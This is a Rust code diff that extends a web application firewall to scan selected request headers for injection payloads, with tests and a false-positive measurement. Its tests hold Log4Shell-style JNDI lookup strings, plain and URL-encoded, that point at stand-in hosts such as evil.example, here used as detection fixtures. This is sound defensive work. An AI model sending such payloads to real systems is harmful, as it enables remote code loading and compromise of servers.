@@ -97,6 +97,18 @@ pub struct WafProfile {
     /// `benchmarks/results/criterion/baseline.json`) hold steady.
     #[serde(default)]
     pub streaming: bool,
+    /// Request headers whose values go through the injection scanner, like the URI: names,
+    /// case-insensitive, with an optional trailing `*` (`"x-*"`; `"*"` is every header).
+    /// Empty (the default) scans none: header-borne payloads such as Log4Shell in a
+    /// `User-Agent` then reach the upstream unscanned.
+    ///
+    /// Off by default because a signature that is right for a query string can be wrong for
+    /// a header: in `aggressive` mode `Origin: http://localhost:3000` and a `Referer` that
+    /// contains `eval(` are blocked. In `balanced` mode the benign header corpus
+    /// (`benchmarks/waf-corpus/headers-benign.json`) has no false positive. Turn it on with
+    /// `waf_shadow = true` first and read `zion_waf_shadow_would_block`.
+    #[serde(default)]
+    pub scan_headers: Vec<String>,
 }
 
 fn default_max_body_mb() -> u64 {
@@ -133,8 +145,64 @@ impl Default for WafProfile {
             entropy_check: true,
             entropy_threshold: default_entropy_threshold(),
             streaming: false,
+            scan_headers: Vec::new(),
         }
     }
+}
+
+impl WafProfile {
+    /// Is `name` (lower-case, as hyper stores header names) one of `scan_headers`?
+    fn scans_header(&self, name: &str) -> bool {
+        self.scan_headers
+            .iter()
+            .any(|entry| match entry.strip_suffix('*') {
+                Some(prefix) => name
+                    .get(..prefix.len())
+                    .is_some_and(|head| head.eq_ignore_ascii_case(prefix)),
+                None => entry.eq_ignore_ascii_case(name),
+            })
+    }
+
+    /// Problems in `scan_headers`, for config validation.
+    pub fn scan_headers_errors(&self) -> Vec<String> {
+        self.scan_headers
+            .iter()
+            .filter(|entry| {
+                let name = entry.strip_suffix('*').unwrap_or(entry);
+                // `*` alone (every header) is allowed; otherwise a header name, maybe a prefix.
+                (name.is_empty() && entry.as_str() != "*")
+                    || !name
+                        .bytes()
+                        .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
+            })
+            .map(|entry| {
+                format!(
+                    "scan_headers entry {entry:?} is not a header name (letters, digits, `-`, \
+                     `_`, with an optional trailing `*`)"
+                )
+            })
+            .collect()
+    }
+}
+
+/// Scan the header values `profile.scan_headers` selects. The first one that matches is
+/// returned with its header name (never its value: a header can hold a credential).
+pub fn validate_headers<'h>(
+    headers: &'h hyper::HeaderMap,
+    profile: &WafProfile,
+) -> Option<(&'h str, &'static str)> {
+    if profile.scan_headers.is_empty() {
+        return None;
+    }
+    headers.iter().find_map(|(name, value)| {
+        if !profile.scans_header(name.as_str()) {
+            return None;
+        }
+        match validate_header_value(value.as_bytes(), profile.mode) {
+            WafVerdict::Deny(reason) => Some((name.as_str(), reason)),
+            WafVerdict::Allow => None,
+        }
+    })
 }
 
 /// WAF verdict — returned from the pipeline.
@@ -1215,33 +1283,60 @@ fn validate_request_impl(
 /// only the `aggressive` pattern set would catch.
 #[inline]
 pub fn validate_uri(uri: &str, mode: WafMode) -> WafVerdict {
+    match scan_text(uri.as_bytes(), mode) {
+        Some(Hit::Raw) => WafVerdict::Deny("injection pattern in URI"),
+        Some(Hit::Encoded) => WafVerdict::Deny("injection pattern in URI (encoded)"),
+        None => WafVerdict::Allow,
+    }
+}
+
+/// Validate one request header value through the same scanner as the URI: raw, then
+/// normalized (URL-decoding, SQL-comment stripping, unicode escapes), so `%24%7Bjndi:` in a
+/// `Referer` is caught like `${jndi:` in a `User-Agent`. Which headers are scanned is the
+/// profile's `scan_headers`; a value is at most the request's header budget, so the cost is
+/// bounded by it.
+#[inline]
+pub fn validate_header_value(value: &[u8], mode: WafMode) -> WafVerdict {
+    match scan_text(value, mode) {
+        Some(Hit::Raw) => WafVerdict::Deny("injection pattern in header"),
+        Some(Hit::Encoded) => WafVerdict::Deny("injection pattern in header (encoded)"),
+        None => WafVerdict::Allow,
+    }
+}
+
+/// Where [`scan_text`] found a pattern.
+enum Hit {
+    Raw,
+    Encoded,
+}
+
+/// One pass of the injection scanner over `text`, then over its normalized forms.
+fn scan_text(text: &[u8], mode: WafMode) -> Option<Hit> {
     let scanner = scanner_for(mode);
 
-    // Scan raw URI
-    if scanner.is_match(uri.as_bytes()) {
-        return WafVerdict::Deny("injection pattern in URI");
+    // Scan the raw text
+    if scanner.is_match(text) {
+        return Some(Hit::Raw);
     }
-    // Normalized URI scan: URL-decode + SQL comment strip + JSON unicode
-    let uri_bytes = uri.as_bytes();
-    let needs_decode =
-        memchr::memchr(b'%', uri_bytes).is_some() || memchr::memchr(b'+', uri_bytes).is_some();
-    let has_sql_comments = uri_bytes.windows(2).any(|w| w == b"/*");
+    // Normalized scan: URL-decode + SQL comment strip + JSON unicode
+    let needs_decode = memchr::memchr(b'%', text).is_some() || memchr::memchr(b'+', text).is_some();
+    let has_sql_comments = text.windows(2).any(|w| w == b"/*");
     // Whitespace-run evasion (raw tab/VT/FF or doubled space) — same rationale
     // as the body gate in validate_request.
-    let has_ws_evasion = uri_bytes.iter().any(|&b| matches!(b, b'\t' | 0x0b | 0x0c))
-        || uri_bytes.windows(2).any(|w| w[0] == b' ' && w[1] == b' ');
+    let has_ws_evasion = text.iter().any(|&b| matches!(b, b'\t' | 0x0b | 0x0c))
+        || text.windows(2).any(|w| w[0] == b' ' && w[1] == b' ');
 
     if needs_decode || has_sql_comments || has_ws_evasion {
-        let verdict = JSON_BUF.with(|buf1| {
+        return JSON_BUF.with(|buf1| {
             WAF_BUF_SEC.with(|buf2| {
                 let mut out = buf1.borrow_mut();
                 let mut sec = buf2.borrow_mut();
 
-                normalize_unified(uri_bytes, &mut out);
+                normalize_unified(text, &mut out);
 
                 for _ in 0..2 {
                     if scanner.is_match(out.as_slice()) {
-                        return Some(WafVerdict::Deny("injection pattern in URI (encoded)"));
+                        return Some(Hit::Encoded);
                     }
 
                     let still_needs_decode = memchr::memchr(b'%', &out).is_some()
@@ -1261,17 +1356,13 @@ pub fn validate_uri(uri: &str, mode: WafMode) -> WafVerdict {
                 }
 
                 if scanner.is_match(out.as_slice()) {
-                    return Some(WafVerdict::Deny("injection pattern in URI (encoded)"));
+                    return Some(Hit::Encoded);
                 }
                 None
             })
         });
-
-        if let Some(v) = verdict {
-            return v;
-        }
     }
-    WafVerdict::Allow
+    None
 }
 
 // ═══════════════════════════════════════════════════════════════════
@@ -1281,6 +1372,176 @@ pub fn validate_uri(uri: &str, mode: WafMode) -> WafVerdict {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    fn scanning(headers: &[&str], mode: WafMode) -> WafProfile {
+        WafProfile {
+            mode,
+            scan_headers: headers.iter().map(|h| h.to_string()).collect(),
+            ..WafProfile::default()
+        }
+    }
+
+    fn header_map(pairs: &[(&str, &str)]) -> hyper::HeaderMap {
+        let mut h = hyper::HeaderMap::new();
+        for (name, value) in pairs {
+            h.append(
+                hyper::header::HeaderName::from_bytes(name.as_bytes()).unwrap(),
+                hyper::header::HeaderValue::from_str(value).unwrap(),
+            );
+        }
+        h
+    }
+
+    /// The case the finding is about (ZION-INPT-02): Log4Shell travels in `User-Agent`.
+    #[test]
+    fn a_payload_in_a_scanned_header_is_denied() {
+        let profile = scanning(&["User-Agent", "referer", "x-*"], WafMode::Balanced);
+        let hit = |pairs: &[(&str, &str)]| {
+            validate_headers(&header_map(pairs), &profile)
+                .map(|(name, reason)| (name.to_string(), reason))
+        };
+        assert_eq!(
+            hit(&[("user-agent", "${jndi:ldap://evil.example/a}")]),
+            Some(("user-agent".into(), "injection pattern in header"))
+        );
+        // URL-encoded in a Referer: found after decoding, like in a URI.
+        assert_eq!(
+            hit(&[(
+                "referer",
+                "https://a.example/?q=%24%7Bjndi:ldap://evil.example/a%7D"
+            )]),
+            Some(("referer".into(), "injection pattern in header (encoded)"))
+        );
+        // A prefix entry covers the custom headers, and only them.
+        assert!(hit(&[("x-api-client", "${jndi:rmi://evil.example/a}")]).is_some());
+        assert_eq!(hit(&[("xyz", "${jndi:rmi://evil.example/a}")]), None);
+        // A header that is not listed is not scanned.
+        assert_eq!(hit(&[("cookie", "a=${jndi:ldap://evil.example/a}")]), None);
+        // An ordinary request passes.
+        assert_eq!(
+            hit(&[
+                (
+                    "user-agent",
+                    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0"
+                ),
+                (
+                    "referer",
+                    "https://www.google.com/search?q=union+square+select+hotels"
+                ),
+                ("x-request-id", "0f9e8d7c-6b5a-4321-fedc-ba0987654321"),
+            ]),
+            None
+        );
+        // No list (the default): nothing is scanned, as before.
+        let off = WafProfile::default();
+        assert!(off.scan_headers.is_empty());
+        assert_eq!(
+            validate_headers(
+                &header_map(&[("user-agent", "${jndi:ldap://evil.example/a}")]),
+                &off
+            ),
+            None
+        );
+        // `*`: every header.
+        let all = scanning(&["*"], WafMode::Balanced);
+        assert!(validate_headers(
+            &header_map(&[("cookie", "a=${jndi:ldap://e.example/a}")]),
+            &all
+        )
+        .is_some());
+    }
+
+    /// The false-positive gate for header scanning: every value of the benign header corpus,
+    /// scanned as if its header were listed. `balanced` must block none. `aggressive` blocks
+    /// exactly the two the docs warn about; a third means a signature changed and the docs,
+    /// or the signature, need another look.
+    #[test]
+    fn benign_headers_are_not_blocked() {
+        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
+            .join("benchmarks/waf-corpus/headers-benign.json");
+        let benign: serde_json::Value =
+            serde_json::from_str(&std::fs::read_to_string(path).unwrap()).unwrap();
+        let blocked = |mode: WafMode| -> Vec<String> {
+            let mut out = Vec::new();
+            for (header, values) in benign.as_object().unwrap() {
+                let Some(values) = values.as_array() else {
+                    continue;
+                };
+                for v in values {
+                    let v = v.as_str().unwrap();
+                    if validate_header_value(v.as_bytes(), mode) != WafVerdict::Allow {
+                        out.push(format!("{header}: {v}"));
+                    }
+                }
+            }
+            out.sort();
+            out
+        };
+        assert_eq!(blocked(WafMode::Balanced), Vec::<String>::new());
+        assert_eq!(
+            blocked(WafMode::Aggressive),
+            [
+                "origin: http://localhost:3000",
+                "referer: https://example.com/docs/javascript/eval()-and-alternatives",
+            ]
+        );
+    }
+
+    #[test]
+    fn scan_headers_entries_are_header_names() {
+        let errors = |entries: &[&str]| scanning(entries, WafMode::Balanced).scan_headers_errors();
+        assert!(errors(&["user-agent", "X-Forwarded-Host", "x-*", "*", "sec_ch_ua"]).is_empty());
+        for bad in ["", "user agent", "x-*-y", "cookie:", "**"] {
+            assert_eq!(errors(&[bad]).len(), 1, "{bad:?}");
+        }
+    }
+
+    /// Measurement, not a check (#519): which benign header values would the scanner block,
+    /// and how many corpus attacks would it catch when they arrive in a header?
+    ///   `cargo test measure_header_scan -- --ignored --nocapture`
+    #[test]
+    #[ignore = "measurement — prints FP / detection for header scanning"]
+    fn measure_header_scan() {
+        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("benchmarks/waf-corpus");
+        let benign: serde_json::Value = serde_json::from_str(
+            &std::fs::read_to_string(dir.join("headers-benign.json")).unwrap(),
+        )
+        .unwrap();
+        for mode in [WafMode::Balanced, WafMode::Aggressive] {
+            let scanner = scanner_for(mode);
+            let (mut total, mut blocked) = (0, 0);
+            for (header, values) in benign.as_object().unwrap() {
+                let Some(values) = values.as_array() else {
+                    continue;
+                };
+                for v in values {
+                    let v = v.as_str().unwrap();
+                    total += 1;
+                    if validate_header_value(v.as_bytes(), mode) != WafVerdict::Allow {
+                        blocked += 1;
+                        let which = scanner
+                            .find(v.as_bytes())
+                            .map(|m| format!("{:?}", &v[m.start()..m.end()]))
+                            .unwrap_or_else(|| "(after decoding)".into());
+                        println!("FP {mode:?} {header}: pattern {which} in {v}");
+                    }
+                }
+            }
+            println!("{mode:?}: benign header values blocked: {blocked}/{total}");
+            let corpus: Vec<serde_json::Value> =
+                serde_json::from_str(&std::fs::read_to_string(dir.join("corpus-v2.json")).unwrap())
+                    .unwrap();
+            let (mut mal, mut caught) = (0, 0);
+            for item in corpus.iter().filter(|i| i["kind"] == "mal") {
+                mal += 1;
+                let p = item["payload"].as_str().unwrap();
+                if validate_header_value(p.as_bytes(), mode) != WafVerdict::Allow {
+                    caught += 1;
+                }
+            }
+            println!("{mode:?}: corpus attacks caught when sent as a header value: {caught}/{mal}");
+        }
+    }
 
     /// Dump the WAF signature vocabulary for the ML-WAF corpus generator
     /// (`ml/generate_corpus.py`), so synthetic attacks are seeded from exactly
